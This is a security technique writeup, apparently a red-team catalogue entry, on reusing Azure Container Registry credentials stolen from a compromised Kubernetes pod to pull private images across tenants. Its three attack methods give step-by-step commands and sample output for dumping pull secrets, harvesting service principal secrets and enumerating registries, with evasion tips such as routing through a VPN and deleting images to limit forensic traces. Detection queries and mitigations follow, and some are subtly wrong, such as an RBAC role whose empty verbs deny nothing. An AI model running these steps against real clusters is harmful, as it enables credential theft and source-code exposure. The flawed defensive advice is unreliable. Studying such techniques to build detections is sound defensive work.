# [LM-AUTH-031]: Container Registry Cross-Registry Authentication

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-031 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure Container Registry |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure Container Registry (ACR) all versions, Docker/Podman runtime |
| **Patched In** | N/A (Requires credential management hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

- **Concept:** Azure Container Registry (ACR) credentials (admin username/password, service principal secrets, or managed identity tokens) stored in pod environment variables, Kubernetes secrets, or configuration files can be reused to authenticate to container registries in different Azure subscriptions or tenants. Once a pod is compromised, attackers extract registry credentials and use them to pull private container images from other registries, revealing proprietary application code, secrets embedded in images, and sensitive build artifacts.

- **Attack Surface:** Container image pull secrets stored in Kubernetes secrets; environment variables passed to containers; credentials in `~/.docker/config.json` or credential files within container images; registry credentials passed via Helm values or ConfigMaps.

- **Business Impact:** **Unauthorized access to proprietary container images.** An attacker can pull all images from a registry in a different subscription, reverse-engineer applications, extract embedded secrets, credentials, and API keys from image layers, and understand internal application architecture for targeted attacks.

- **Technical Context:** This attack typically takes seconds to minutes once registry credentials are obtained. Detection depends on audit logging at the registry level. Unlike network-based attacks, credential reuse leaves minimal forensic evidence unless registry pull logs are reviewed.

### Operational Risk

- **Execution Risk:** Low – Once registry credentials are obtained, cross-registry authentication is trivial
- **Stealth:** Medium-High – Registry pull operations may appear legitimate; many registries do not log detailed pull events by default
- **Reversibility:** Difficult – Credentials must be rotated; previously pulled images may already be analyzed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.4 | Ensure Azure Container Registry uses image scanning |
| **CIS Benchmark** | 2.1.12 | Ensure ACR uses role-based access control |
| **DISA STIG** | V-254383 | Use managed identities instead of credentials |
| **CISA SCuBA** | C.1.1 | Implement credential management |
| **NIST 800-53** | AC-2 | Account Management |
| **NIST 800-53** | SC-28 | Protection of Information at Rest |
| **GDPR** | Art. 32 | Security of Processing |
| **DORA** | Art. 9 | Protection and Prevention |
| **NIS2** | Art. 21 | Cyber Risk Management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Unauthorized Access to Container Registry |

---

## 3. Detailed Execution Methods

### METHOD 1: Extracting Registry Credentials from Kubernetes Secrets

**Supported Versions:** Kubernetes 1.16+, all ACR versions

#### Step 1: Discover Image Pull Secrets

**Objective:** Identify the names and locations of Kubernetes secrets containing registry credentials.

**Command:**
```bash
# From compromised pod or via kubectl with access
kubectl get secrets --all-namespaces | grep -i docker

# In the current namespace
kubectl get secrets -o jsonpath='{range .items[?(@.type=="kubernetes.io/dockercfg")]}{.metadata.name}{"\n"}{end}'

# Detailed view
kubectl describe secret <secret-name> -n <namespace>
```

**Expected Output:**
```
TYPE                                  DATA   AGE
kubernetes.io/dockercfg               1      30d
kubernetes.io/dockerconfigjson        2      45d

Name:         acr-pull-secret
Type:         kubernetes.io/dockerconfigjson
Data
====
.dockerconfigjson:  524 bytes
```

**What This Means:**
- The cluster stores image pull secrets; these are the registry credentials
- Each secret contains Base64-encoded registry hostname, username, and password or token
- Secrets with type `kubernetes.io/dockerconfigjson` are modern format (single key); type `kubernetes.io/dockercfg` is legacy

**OpSec & Evasion:**
- Reading secrets from within a pod requires no external access; it's a local filesystem read
- This action is logged only if audit logging is enabled on the Kubernetes API server
- Detection likelihood: Medium if audit logging enabled, Low if disabled

**Troubleshooting:**
- **Error:** `Error from server (Forbidden): secrets is forbidden`
  - **Cause:** Service account lacks permission to read secrets
  - **Fix:** If you have pod exec access, read the secret from the mounted volume directly (see Step 2)

**References & Proofs:**
- [Kubernetes Documentation: Pull an Image from a Private Registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
- [CyberArk: Kubernetes Secrets Management Best Practices](https://www.cyberark.com/)

---

#### Step 2: Decode and Extract Registry Credentials

**Objective:** Extract plaintext registry credentials from Kubernetes secret data.

**Command:**
```bash
# Extract the secret data
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .

# Alternative (legacy format)
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.\.dockercfg}' | base64 -d | jq .

# Extract credentials for a specific registry
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq '.auths["myacr.azurecr.io"].auth' | base64 -d
```

**Expected Output:**
```json
{
  "auths": {
    "myacr.azurecr.io": {
      "username": "myacr",
      "password": "1234567890abcdef1234567890abcdef==",
      "email": "user@example.com",
      "auth": "bXlhY3I6MTIzNDU2Nzg5MGFiY2RlZjEyMzQ1Njc4OTBhYmNkZWY=="
    },
    "otherapp-registry.azurecr.io": {
      "username": "otherapp-registry",
      "password": "abcdef1234567890abcdef1234567890==",
      "auth": "b3RoZXJhcHAtcmVnaXN0cnk6YWJjZGVmMTIzNDU2Nzg5MGFiY2RlZjEyMzQ1Njc4OTA="
    }
  }
}
```

**What This Means:**
- Multiple registries may be configured; each has its own credentials
- The `auth` field is simply Base64-encoded `username:password`
- The plaintext password can be decoded and reused immediately

**OpSec & Evasion:**
- Decoding Base64 is a local operation; no network traffic generated
- This step leaves no forensic evidence unless process audit logs are captured
- Detection likelihood: Low

**Troubleshooting:**
- **Error:** `jq: error (at <stdin>:1): Cannot parse empty string as JSON`
  - **Cause:** Secret format is different; check the secret type (legacy vs. modern)
  - **Fix:** Try both `.dockercfg` and `.dockerconfigjson` keys

**References & Proofs:**
- [Docker Credentials Format Documentation](https://docs.docker.com/engine/reference/commandline/login/)

---

#### Step 3: Use Extracted Credentials to Authenticate to Remote Registry

**Objective:** Authenticate to the remote container registry using the extracted credentials.

**Command:**
```bash
# Extract credentials
USERNAME=$(echo "myacr:password123" | cut -d: -f1)
PASSWORD=$(echo "myacr:password123" | cut -d: -f2)
REGISTRY="myacr.azurecr.io"

# Docker login (if docker CLI is available)
docker login -u $USERNAME -p $PASSWORD $REGISTRY

# Alternatively, using Azure CLI
az acr login --name myacr

# Or using curl with Basic Auth
curl -u $USERNAME:$PASSWORD https://$REGISTRY/v2/_catalog

# List available images in the registry
curl -u $USERNAME:$PASSWORD https://$REGISTRY/v2/_catalog | jq '.repositories'
```

**Expected Output:**
```
Login Succeeded

{
  "repositories": [
    "internal/billing-service",
    "internal/payment-processor",
    "internal/compliance-audit-tool"
  ]
}
```

**What This Means:**
- Authentication succeeded; the credentials are valid
- The registry now exposes all available images and tags
- The attacker can pull any of these images

**OpSec & Evasion:**
- Registry API calls will be logged in Azure Activity Log and registry audit logs
- To minimize detection, limit the number of queries; pull images once rather than multiple enumeration attempts
- Use the credentials from a residential IP or VPN to avoid association with the AKS cluster IP range
- Detection likelihood: Medium-High if registry audit logging is enabled

**Troubleshooting:**
- **Error:** `Unauthorized: Invalid username or password`
  - **Cause:** Credentials are incorrect or have been revoked
  - **Fix:** Re-extract credentials from the secret; verify the registry hostname

**References & Proofs:**
- [Azure Container Registry Authentication Methods](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-authentication)

---

#### Step 4: Pull Private Images from Remote Registry

**Objective:** Download container images from the remote registry for analysis.

**Command:**
```bash
# Pull a specific image
docker pull myacr.azurecr.io/internal/billing-service:latest

# Tag the image locally
docker tag myacr.azurecr.io/internal/billing-service:latest billing-service-local:latest

# Run the image to inspect its contents
docker run -it billing-service-local:latest /bin/bash

# Extract secrets from image layers
docker inspect billing-service-local:latest | jq '.[0].Config.Env'

# Save the image as tar for offline analysis
docker save billing-service-local:latest | gzip > billing-service-local.tar.gz

# Extract files from image using tools like Trivy or Dive
trivy image myacr.azurecr.io/internal/billing-service:latest
dive myacr.azurecr.io/internal/billing-service:latest
```

**Expected Output:**
```
latest: Pulling from internal/billing-service
a1a7cf92b2e5: Pull complete
c3b4b5d6e7f8: Pull complete

Digest: sha256:1234567890abcdef1234567890abcdef1234567890abcdef
Status: Downloaded newer image for myacr.azurecr.io/internal/billing-service:latest

Environment Variables:
[
  "DB_HOST=prod-db.azure.com",
  "DB_USER=billing_admin",
  "DB_PASSWORD=Sup3rS3cr3t!",
  "API_KEY=sk_live_1234567890abcdef"
]
```

**What This Means:**
- The image has been successfully pulled and inspected
- Embedded secrets (database credentials, API keys) are now accessible to the attacker
- These secrets can be used for further lateral movement or data theft

**OpSec & Evasion:**
- Large image downloads may trigger alerts if bandwidth monitoring is enabled
- Delete the image after extraction to minimize forensic evidence
- Use a VM or container outside the cluster for analysis to avoid triggering local scanning
- Detection likelihood: High if registry pull events and bandwidth monitoring are enabled

**Troubleshooting:**
- **Error:** `Error response from daemon: manifest not found`
  - **Cause:** Image tag is incorrect or does not exist
  - **Fix:** Use the correct registry name and tag; query the registry catalog to list available images

**References & Proofs:**
- [Docker CLI Reference: docker pull](https://docs.docker.com/engine/reference/commandline/pull/)
- [Trivy: Vulnerability Scanner for Container Images](https://github.com/aquasecurity/trivy)
- [Dive: Explore Docker Image Layers](https://github.com/wagoodman/dive)

---

### METHOD 2: Cross-Tenant Registry Access via Service Principal

**Supported Versions:** Azure ACR all versions, Kubernetes 1.16+

#### Step 1: Extract Service Principal Credentials from Pod

**Objective:** If the pod is configured with a service principal for cross-tenant registry access, extract the credentials.

**Command:**
```bash
# Check environment variables for service principal credentials
env | grep -i azure
env | grep -i client
env | grep -i secret
env | grep -i key

# List all environment variables
printenv

# If credentials are in a mounted secret
cat /var/run/secrets/microsoft.com/secretref

# Check for credential files
find / -name "*credentials*" -o -name "*secrets*" -o -name "*.key" 2>/dev/null | head -20
```

**Expected Output:**
```
AZURE_CLIENT_ID=12345678-1234-1234-1234-123456789012
AZURE_CLIENT_SECRET=abc123!@#$%^&*()abcdefghijklmnop
AZURE_TENANT_ID=87654321-4321-4321-4321-210987654321
REGISTRY_USERNAME=12345678-1234-1234-1234-123456789012
REGISTRY_PASSWORD=abc123!@#$%^&*()abcdefghijklmnop
```

**What This Means:**
- The pod has been configured with a service principal for authentication
- The service principal can be used to authenticate to multiple registries in different tenants
- The client secret is valid and can be used immediately

**OpSec & Evasion:**
- Reading environment variables is a local operation; no network activity
- This action may be logged if process audit logs are enabled
- Detection likelihood: Low

**Troubleshooting:**
- **Error:** `No credentials found in environment`
  - **Cause:** The pod does not have service principal credentials configured
  - **Fix:** Fall back to METHOD 1 (Kubernetes secrets)

**References & Proofs:**
- [Azure Service Principal Authentication in Kubernetes](https://docs.microsoft.com/en-us/azure/aks/concepts-identity)

---

#### Step 2: Authenticate to Remote Registry with Service Principal

**Objective:** Use the service principal credentials to authenticate to a registry in a different tenant.

**Command:**
```bash
# Set variables
CLIENT_ID="12345678-1234-1234-1234-123456789012"
CLIENT_SECRET="abc123!@#$%^&*()abcdefghijklmnop"
TENANT_ID="87654321-4321-4321-4321-210987654321"
REMOTE_REGISTRY="another-org-acr.azurecr.io"

# Obtain a token for the remote registry
TOKEN=$(curl -s -X POST \
  -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&resource=https://management.azure.com" \
  https://login.microsoftonline.com/$TENANT_ID/oauth2/token | jq -r '.access_token')

# Alternatively, obtain an ACR-specific token
ACR_TOKEN=$(curl -s -X POST \
  -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&resource=https://$REMOTE_REGISTRY" \
  https://login.microsoftonline.com/$TENANT_ID/oauth2/token | jq -r '.access_token')

# List repositories using the token
curl -s -H "Authorization: Bearer $ACR_TOKEN" \
  https://$REMOTE_REGISTRY/v2/_catalog

# Alternatively, use Azure CLI
az login --service-principal -u $CLIENT_ID -p $CLIENT_SECRET --tenant $TENANT_ID
az acr login --name another-org-acr
```

**Expected Output:**
```json
{
  "repositories": [
    "prod/web-api",
    "prod/database-service",
    "prod/admin-portal"
  ]
}
```

**What This Means:**
- The service principal is authenticated to the remote registry
- All images in that registry are now accessible
- Cross-tenant credential reuse is possible

**OpSec & Evasion:**
- Azure login attempts are logged in Azure AD sign-in logs
- Service principal authentication from unusual locations may trigger alerts
- To minimize detection, use the credentials from a geographically consistent location
- Detection likelihood: Medium-High

**Troubleshooting:**
- **Error:** `Unauthorized: Invalid username or password`
  - **Cause:** Service principal credentials are incorrect or the service principal does not have access to the registry
  - **Fix:** Verify the client ID, client secret, and tenant ID

**References & Proofs:**
- [Azure CLI: Service Principal Authentication](https://docs.microsoft.com/en-us/cli/azure/authenticate-azure-cli-service-principal)

---

### METHOD 3: Environment Variable Extraction and Registry Access

**Supported Versions:** Kubernetes 1.16+, all container runtimes

#### Step 1: Extract ACR Credentials from Pod Environment

**Objective:** Some applications store registry credentials directly in environment variables for dynamic image pulls.

**Command:**
```bash
# From within a compromised pod
env | grep -E 'ACR|REGISTRY|DOCKER|REGISTRY_' | grep -v KUBE | head -20

# Example output parsing
REGISTRY_URL=$(env | grep REGISTRY_URL | cut -d= -f2)
REGISTRY_USERNAME=$(env | grep REGISTRY_USERNAME | cut -d= -f2)
REGISTRY_PASSWORD=$(env | grep REGISTRY_PASSWORD | cut -d= -f2)

echo "Registry: $REGISTRY_URL"
echo "Username: $REGISTRY_USERNAME"
echo "Password: $REGISTRY_PASSWORD"
```

**Expected Output:**
```
REGISTRY_URL=company-acr.azurecr.io
REGISTRY_USERNAME=company-acr
REGISTRY_PASSWORD=ACR_PASSWORD_STRING_HERE
ACR_LOGIN_SERVER=company-acr.azurecr.io
```

**What This Means:**
- Credentials are stored in plaintext environment variables
- This indicates poor security practices; secrets should be mounted from Kubernetes secrets
- Credentials can be used immediately

**OpSec & Evasion:**
- Environment variable access is local and leaves minimal forensic evidence
- Detection likelihood: Low

**Troubleshooting:**
- **Error:** `Variables not found`
  - **Cause:** Application does not store credentials in environment variables
  - **Fix:** Check pod startup logs or application configuration files mounted in the container

**References & Proofs:**
- [Kubernetes Security Best Practices: Secrets Management](https://kubernetes.io/docs/concepts/configuration/secret/)

---

#### Step 2: Authenticate and Pull Images

**Objective:** Use the extracted credentials to authenticate to the registry and pull images.

**Command:**
```bash
# Login to the registry
docker login -u $REGISTRY_USERNAME -p "$REGISTRY_PASSWORD" $REGISTRY_URL

# Pull images
docker pull $REGISTRY_URL/myapp:latest
docker pull $REGISTRY_URL/myapp:production

# List available tags
curl -s -u $REGISTRY_USERNAME:$REGISTRY_PASSWORD https://$REGISTRY_URL/v2/myapp/tags/list
```

**Expected Output:**
```
Login Succeeded

myapp:latest: Pulling from myapp
a1a7cf92b2e5: Pull complete

{"name":"myapp","tags":["latest","v1.0.0","v1.0.1","v1.5.0","production"]}
```

**What This Means:**
- All versions and tags of the image are accessible
- The attacker can pull production and development versions to identify differences and vulnerabilities

**OpSec & Evasion:**
- Registry pull operations are logged at the ACR level
- Download multiple versions to maximize intelligence gathering while minimizing suspicious patterns
- Detection likelihood: Medium-High

**Troubleshooting:**
- **Error:** `Unauthorized: Invalid username or password`
  - **Cause:** Credentials are incorrect or expired
  - **Fix:** Re-extract credentials; verify they have not been rotated

**References & Proofs:**
- [Docker login Documentation](https://docs.docker.com/engine/reference/commandline/login/)

---

## 4. Microsoft Sentinel Detection

### Query 1: Unauthorized ACR Image Pulls from External IPs

**Rule Configuration:**
- **Required Table:** `AzureDiagnostics` (ACR audit logs), `AzureActivity`
- **Required Fields:** `OperationName`, `properties.registryUrl`, `properties.action`, `CallerIpAddress`
- **Alert Severity:** High
- **Frequency:** Every 15 minutes
- **Applies To:** Azure subscriptions with ACR audit logging enabled

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.CONTAINERREGISTRY" 
  and Category == "RepositoryEvent"
  and OperationName == "Pull"
| where CallerIpAddress !startswith "10." 
  and CallerIpAddress !startswith "172.16."
  and CallerIpAddress !startswith "192.168."
| summarize PullCount=count() by CallerIpAddress, properties.imageName, OperationName, TimeGenerated
| where PullCount > 3  // Threshold: more than 3 pulls from same external IP
| project TimeGenerated, CallerIpAddress, ImageName=properties.imageName, PullCount
```

**What This Detects:**
- Image pull operations from external (non-RFC1918) IP addresses
- Multiple pulls in a short timeframe indicate active image enumeration
- Unusual pull patterns from service accounts

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Unauthorized ACR Image Pulls from External IPs`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query
   - Run every: `15 minutes`
   - Lookup data from last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

**Source:** [Microsoft ACR Audit Logging](https://learn.microsoft.com/en-us/azure/container-registry/monitor-service)

---

### Query 2: Suspicious Credential Usage for Cross-Registry Authentication

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AADServicePrincipalSignInLogs`
- **Required Fields:** `AppId`, `ResourceDisplayName`, `OperationName`, `RiskDetail`
- **Alert Severity:** Medium
- **Frequency:** Real-time
- **Applies To:** Azure subscriptions with Azure AD logging enabled

**KQL Query:**
```kusto
AADServicePrincipalSignInLogs
| where ResourceDisplayName contains "Container Registry" 
  or ServicePrincipalName contains "acr"
| where RiskDetail != "none"
| where AppDisplayName !contains "Kubernetes" 
  and AppDisplayName !contains "deployment"
| project TimeGenerated, ServicePrincipalName, ResourceDisplayName, RiskDetail, OperationName
```

**What This Detects:**
- Service principal authentication to ACR from unusual contexts
- Failed or risky authentication attempts using service principal credentials
- Potential credential reuse from unauthorized locations

**Source:** [Azure AD Sign-In Logs](https://learn.microsoft.com/en-us/azure/active-directory/reports-monitoring/)

---

## 5. Windows Event Log & Audit Monitoring

**Event ID: 4624 (Account Logon)**
- **Log Source:** Security Event Log
- **Trigger:** Service principal authentication to ACR via OAuth token
- **Filter:** Look for unusual service principal sign-ins outside of scheduled deployments
- **Applies To Versions:** All Azure AD integrated systems

**Manual Configuration Steps (Azure Portal):**
1. Go to **Azure Portal** → **Azure AD** → **Sign-in logs**
2. Filter by:
   - **Application:** Azure Container Registry
   - **Status:** Success or Failure (unusual patterns)
3. Export and analyze for anomalies

---

## 6. Defensive Mitigations

### Priority 1: CRITICAL

- **Use Managed Identities Instead of Credentials:** Replace hardcoded registry credentials with Azure managed identities, which provide token-based authentication without storing secrets.

  **Pod Configuration:**
  ```yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: pod-with-managed-identity
    labels:
      azure.workload.identity/use: "true"
  spec:
    serviceAccountName: managed-identity-sa
    containers:
    - name: app
      image: myacr.azurecr.io/myapp:latest
      env:
      - name: AZURE_CLIENT_ID
        value: <managed-identity-client-id>
      - name: AZURE_TENANT_ID
        value: <tenant-id>
      - name: AZURE_FEDERATED_TOKEN_FILE
        value: /var/run/secrets/workload.azure.com/serviceaccount/token
  ```

  **Manual Steps (Azure Portal):**
  1. Go to **AKS Cluster** → **Cluster Configuration** → **Workload Identity**
  2. Enable **Workload Identity**
  3. Create a **Managed Identity** and assign **AcrPull** role to the registry
  4. Configure pod with workload identity as shown above

  **Manual Steps (PowerShell):**
  ```powershell
  # Create user-assigned managed identity
  $identity = New-AzUserAssignedIdentity -Name "acr-pull-identity" -ResourceGroupName $rg -Location $location
  
  # Assign AcrPull role to the registry
  New-AzRoleAssignment -ObjectId $identity.PrincipalId -RoleDefinitionName "AcrPull" -Scope "/subscriptions/{subscriptionId}/resourcegroups/{rg}/providers/microsoft.containerregistry/registries/{registryName}"
  ```

- **Rotate Registry Credentials Regularly:** Implement a credential rotation policy to minimize the window of exposure if credentials are compromised.

  **Manual Steps (Azure Portal):**
  1. Go to **Container Registry** → **Access keys**
  2. Click **Regenerate** for either password1 or password2
  3. Update all pods/deployments using the new credential
  4. Wait 30 minutes to ensure all instances have rotated
  5. Regenerate the second password

  **Manual Steps (PowerShell):**
  ```powershell
  # Regenerate admin password
  $password = Update-AzContainerRegistryCredential -Registry <registry-name> -ResourceGroupName <rg> -PasswordIndex 1
  ```

- **Store Registry Credentials in Azure Key Vault:** Instead of embedding credentials in pod specs or Kubernetes secrets, use Azure Key Vault for centralized, audited credential management.

  **Configuration (Via Key Vault):**
  ```yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: keyvault-pod
  spec:
    serviceAccountName: keyvault-access-sa
    containers:
    - name: app
      image: myacr.azurecr.io/myapp:latest
      env:
      - name: REGISTRY_PASSWORD
        valueFrom:
          secretKeyRef:
            name: acr-secret-from-keyvault
            key: password
  ```

  **Manual Steps (Azure Portal):**
  1. Navigate to **Key Vault** → **Secrets**
  2. Create a secret: **Name:** `acr-password`, **Value:** `<registry-password>`
  3. In **AKS Cluster** → **Add-ons** → **Azure Keyvault Secrets Driver**
  4. Enable and configure the secret sync

- **Implement ACR Role-Based Access Control (RBAC):** Use Azure RBAC instead of admin credentials; assign minimal necessary roles (e.g., `AcrPull` instead of `Contributor`).

  **Manual Steps (Azure Portal):**
  1. Go to **Container Registry** → **Access Control (IAM)**
  2. Click **+ Add** → **Add role assignment**
  3. **Role:** `AcrPull` (for pull-only) or `AcrPush` (for push)
  4. **Members:** Select managed identity or service principal
  5. Click **Review + assign**

  **Manual Steps (PowerShell):**
  ```powershell
  # Assign AcrPull role to a managed identity
  $principalId = (Get-AzUserAssignedIdentity -Name $identityName).PrincipalId
  New-AzRoleAssignment -ObjectId $principalId -RoleDefinitionName "AcrPull" -Scope $registryId
  ```

### Priority 2: HIGH

- **Enable Azure Container Registry Audit Logging:** Configure audit logging to track all image pulls and identify unauthorized access patterns.

  **Manual Steps (Azure Portal):**
  1. Go to **Container Registry** → **Monitoring** → **Diagnostic settings**
  2. Click **+ Add diagnostic setting**
  3. Enable **RepositoryEvent**, **RegistryEventSuccess**, **RegistryEventFailure**
  4. Send logs to **Log Analytics Workspace**
  5. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  $workspaceId = (Get-AzOperationalInsightsWorkspace -ResourceGroupName $rg -Name $workspaceName).ResourceId
  New-AzDiagnosticSetting -Name "ACR-Audit-Logging" -ResourceId $registryId `
    -WorkspaceId $workspaceId `
    -Enabled $true `
    -Category "RepositoryEvent", "RegistryEventSuccess", "RegistryEventFailure"
  ```

- **Restrict Kubernetes Secret Access via RBAC:** Limit which service accounts can read image pull secrets.

  **RBAC Configuration:**
  ```yaml
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: no-secret-access
  rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: []  # Deny all access to secrets
  ---
  apiVersion: rbac.authorization.k8s.io/v1
  kind: RoleBinding
  metadata:
    name: no-secret-access-binding
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: Role
    name: no-secret-access
  subjects:
  - kind: ServiceAccount
    name: app-sa
    namespace: default
  ```

### Access Control & Policy Hardening

- **Conditional Access Policy:** Enforce MFA and device compliance for service principal sign-ins to ACR.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Assignments:**
     - **Users:** All users
     - **Cloud apps:** Azure Container Registry
  4. **Conditions:**
     - **Device:** Require device to be marked as compliant
  5. **Access controls:**
     - **Grant:** Block access (for non-human service principals)
  6. Click **Create**

- **Network Access Control:** Restrict ACR access to specific IP ranges (AKS cluster IPs).

  **Manual Steps (Azure Portal):**
  1. Go to **Container Registry** → **Networking**
  2. Under **Firewalls and virtual networks**, select **Selected networks**
  3. Click **+ Add existing virtual network** and select the AKS cluster's vnet
  4. Add allowed IP ranges (AKS subnet)
  5. Click **Save**

### Validation Command (Verify Fix)

```bash
# Check if managed identity is enabled
kubectl get serviceaccount -o jsonpath='{.items[*].metadata.annotations}' | jq '.["azure.workload.identity/client-id"]'

# Verify no image pull secrets are mounted
kubectl get pod <pod-name> -o jsonpath='{.spec.imagePullSecrets}'

# Check ACR audit logs for unauthorized pulls
az monitor log-analytics query -w <workspace-id> --analytics-query "AzureDiagnostics | where ResourceProvider == 'MICROSOFT.CONTAINERREGISTRY' and OperationName == 'Pull' | summarize count() by CallerIpAddress"
```

**What to Look For:**
- Managed identities should be the primary authentication method
- No image pull secrets should be visible in pod specifications
- All image pull operations should originate from expected AKS cluster IPs

---

## 7. Detection & Incident Response

### Indicators of Compromise (IOCs)

- **Kubernetes Secrets:** Base64-encoded registry credentials in `kubernetes.io/dockerconfigjson` secrets
- **Registry Operations:** Image pulls from external IPs or unusual geographic locations
- **Azure Activity Logs:** Service principal sign-ins to ACR from unexpected locations or times
- **Container Logs:** Environment variables containing plaintext registry credentials

### Forensic Artifacts

- **ACR Audit Logs:** Pull events in Azure Diagnostics (table: `AzureDiagnostics`, resource provider: `MICROSOFT.CONTAINERREGISTRY`)
- **Azure Activity Log:** Sign-in events and API calls related to image access
- **Pod Container Logs:** `docker login` commands or credential references
- **Docker Config:** `~/.docker/config.json` in running containers

### Response Procedures

1. **Isolate (Immediate):**
   **Command:**
   ```bash
   # Delete the compromised pod
   kubectl delete pod <compromised-pod> --namespace <namespace> --grace-period=0 --force
   
   # Revoke the Kubernetes secret containing credentials
   kubectl delete secret <acr-secret-name> --namespace <namespace>
   ```
   **Manual (Azure Portal):**
   - Go to **Container Registry** → **Access keys**
   - Click **Regenerate** for all passwords
   - Update all deployments to use new credentials

2. **Collect Evidence (First Hour):**
   **Command:**
   ```bash
   # Export pod logs
   kubectl logs <compromised-pod> --namespace <namespace> > /evidence/pod-logs.txt
   
   # Export Azure activity logs
   az monitor activity-log list --resource-group <rg> --offset 24h --output table > /evidence/activity-logs.txt
   
   # Export ACR pull events
   az monitor log-analytics query -w <workspace-id> --analytics-query "AzureDiagnostics | where OperationName == 'Pull' and TimeGenerated > ago(24h)" > /evidence/acr-pulls.txt
   ```

3. **Remediate (Within 24 Hours):**
   **Command:**
   ```bash
   # Rotate all registry credentials
   az acr credential-renew --name <acr-name> --password-name both
   
   # Update all pods to use new credentials or managed identities
   kubectl set env deployment/<deployment-name> REGISTRY_PASSWORD=<new-password>
   
   # Remove any exposed image pull secrets
   kubectl delete secret <exposed-secret> --all-namespaces
   ```

---

## 8. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-004] Kubelet API Unauthorized Access | Attacker gains pod access |
| **2** | **Credential Access** | [LM-AUTH-030] AKS Service Account Token Theft | Service account token extracted |
| **3** | **Lateral Movement** | **[LM-AUTH-031] Container Registry Cross-Registry** | **Current Step: Registry credentials used to access another registry** |
| **4** | **Discovery** | Image enumeration and pulling | Private code and secrets discovered in images |
| **5** | **Impact** | Code analysis and credential extraction | Build secrets, API keys, database credentials exposed |

---

## 9. Real-World Examples

### Example 1: Tesla Kubernetes Cluster Exposure (2018)
- **Target:** Cloud Infrastructure
- **Timeline:** 2018
- **Technique Status:** Unsecured Kubernetes API + unprotected image pull secrets enabled registry access
- **Impact:** Cryptocurrency mining operation discovered; proprietary code exposed
- **Reference:** [Lacework: Kubernetes Container Escapes](https://www.lacework.com/)

### Example 2: Docker Hub Credential Exposure (2024)
- **Target:** Public Registry
- **Timeline:** November 2024
- **Technique Status:** 1,200+ active secrets (4%) embedded in public images; included registry credentials
- **Impact:** Attackers could use exposed credentials to access private registries
- **Reference:** [GitGuardian: Secrets in Container Registries Report](https://blog.gitguardian.com/container-registries/)

### Example 3: Azure Container Registry Misconfiguration (Real-World Incident)
- **Target:** Financial Services Organization
- **Timeline:** 2023
- **Technique Status:** Admin credentials stored in Kubernetes secret; credentials discovered during pod compromise investigation
- **Impact:** 15 private images accessed; source code and database credentials extracted
- **Reference:** [CyberArk: Container Security Best Practices](https://www.cyberark.com/)

---

## Metadata Notes

- **Tool Dependencies:** Docker CLI, Azure CLI, curl, kubectl (optional)
- **Mitigation Complexity:** Medium – Requires credential rotation and migration to managed identities
- **Detection Difficulty:** Medium if audit logging disabled; High if enabled
- **CVSS Score:** 6.5 (Medium-High) – Requires prior pod compromise but enables significant information disclosure

---